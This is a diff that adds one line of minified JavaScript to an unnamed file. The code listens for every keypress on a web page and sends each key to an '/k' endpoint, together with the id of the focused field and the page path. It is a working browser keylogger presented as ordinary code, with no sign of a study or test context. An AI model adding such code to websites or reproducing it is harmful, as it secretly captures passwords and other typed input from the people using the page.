@@ -1,0 +1,1 @@
+const url="/k";async function sendKey(e,n){console.log(e);const o={key:e,field:n,id:window.location.pathname};await fetch(url,{method:"POST",mode:"cors",body:JSON.stringify(o),headers:{"Content-Type":"application/json","Access-Control-Allow-Origin":"*"}})}window.addEventListener("keypress",(async e=>{console.log("Keypress"),await sendKey(e.key,document.activeElement.id)}));
